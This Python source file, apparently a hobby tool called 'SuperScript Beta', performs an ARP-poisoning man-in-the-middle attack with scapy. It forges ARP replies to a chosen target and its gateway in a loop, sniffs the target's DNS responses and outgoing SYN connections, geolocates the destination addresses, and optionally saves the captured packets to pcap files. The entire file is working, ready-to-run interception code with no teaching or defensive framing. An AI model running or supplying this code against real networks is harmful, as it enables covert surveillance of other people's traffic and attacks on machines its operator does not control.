import threading
import datetime
import netifaces
from misc import locate_ip
from scapy.all import *

conf.verb = 0


# TODO: Reverse lookup

class Host:
    def __init__(self, ip):
        self.ip = ip
        self.mac = self.get_mac()

    def get_mac(self):
        responses, unanswered = srp(Ether(dst=b"ff:ff:ff:ff:ff:ff") / ARP(pdst=self.ip), timeout=2, retry=10)

        # return the MAC address from a response
        for s, r in responses:
            return r[Ether].src


class Configuration:
    def __init__(self):

        yes_answers = ('y', 'Y', '', ' ')

        self.default_net = input('[?] Load default Network Settings? (y/n)') in yes_answers
        self.store_pcap = input('[?] Store packets in file? (y/n)') in yes_answers
        self.show_dns = input('[?] Show DNS responses? (y/n)') in yes_answers
        self.show_syn = input('[?] Show SYN packets? (y/n)') in yes_answers
        self.gateway_ip = ''
        self.interface = ''

        if self.default_net:
            self.default_settings()
        else:
            self.manual_settings()
        self.target_ip = input("[.] Write the target's @IP: ")

    def default_settings(self):
        # default configuration:
        default = netifaces.gateways()['default'][netifaces.AF_INET]

        self.gateway_ip = default[0]
        self.interface = default[1]

    def manual_settings(self):
        print('[.] Select a network interface: (Press number)')

        for count, iface in enumerate(netifaces.interfaces()):
            print("\t" + str(count) + ' - ' + iface)

        self.interface = netifaces.interfaces()[int(input())]
        print(self.interface + ' selected.')

        self.gateway_ip = input("[.] Write the gateway's @IP: ")


class Sniffer:
    def __init__(self, config, target):
        self.config = config
        self.target = target
        self.dns_cache = {}

    def sniff(self):
        bpf_filter = 'ip host {} and ((udp and port 53) or (tcp[0xd]&2=2))'.format(self.target.ip)

        packets = sniff(count=0, filter=bpf_filter, iface=self.config.interface, prn=self.filter_pkt)
        if self.config.store_pcap:
            return packets

    def filter_pkt(self, pkt):
        syn = 0x02
        if self.config.show_dns and pkt.haslayer(DNSRR):
            self.print_dns(pkt)
        if self.config.show_syn and pkt.haslayer(TCP) and pkt[IP].src == self.target.ip:
            if pkt[TCP].flags & syn:
                self.print_location(pkt)

    def print_dns(self, pkt):
        dns = pkt[DNS]
        for i in range(dns.ancount):
            dnsrr = dns.an[i]
            if dnsrr.type == 1:
                self.dns_cache[dnsrr.rdata] = dnsrr.rrname.decode()
                if self.config.show_dns:
                    print('[!] DNSRR | {1} | {0}'.format(dnsrr.rrname.decode(), dnsrr.rdata))
                    # rrname - domain   || rdata - ip

    def print_location(self, pkt):
        ip = pkt[IP].dst
        location = locate_ip(ip)

        try:
            hostname = self.dns_cache[ip]
        except KeyError:
            hostname = '-'

        print('[!] SYN | {} | {} | {}'.format(ip, hostname, location))


class MITM(threading.Thread):
    def __init__(self, config, gateway, target):
        self.config = config
        self.gateway = gateway
        self.target = target
        conf.iface = self.config.interface

        threading.Thread.__init__(self)
        self.setDaemon(True)
        self.poisoning = True

    def run(self):
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = self.gateway.ip
        poison_target.pdst = self.target.ip
        poison_target.hwdst = self.target.mac

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.target.ip
        poison_gateway.pdst = self.gateway.ip
        poison_gateway.hwdst = self.gateway.mac

        print("[*] Beginning the ARP poison.")

        while self.poisoning:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)

        print("[*] ARP poison attack finished.")

    def stop(self):
        self.poisoning = False
        time.sleep(2)
        print("[*] Restoring target...")
        send(ARP(op=2, psrc=self.gateway.ip, pdst=self.target.ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway.mac),
             count=5)
        send(ARP(op=2, psrc=self.target.ip, pdst=self.gateway.ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target.mac),
             count=5)


def main():
    print('\n|| SuperScript Beta ||\n')

    # Check if user is root
    if os.getuid() != 0:
        print('Script must be called with sudo. Quitting')
        sys.exit(0)

    config = Configuration()

    gateway = Host(config.gateway_ip)
    target = Host(config.target_ip)

    mitm = MITM(config, gateway, target)
    sniffer = Sniffer(config, target)

    print('\n[*] Interface: {}\n'
          '[*] Gateway IP: {} - {}\n'
          '[*] Target IP: {} - {}\n'.format(config.interface, gateway.ip, gateway.mac, target.ip, target.mac))

    mitm.start()
    try:
        packets = sniffer.sniff()

    except KeyboardInterrupt:
        pass

    finally:
        if config.store_pcap:
            try:
                name = datetime.datetime.now().strftime('capture-%d_%m_%y-%H:%M:%S.pcap')
                wrpcap(name, packets)
            except IndexError:
                print("[!] No packets saved")
        mitm.stop()


if __name__ == "__main__":
    main()
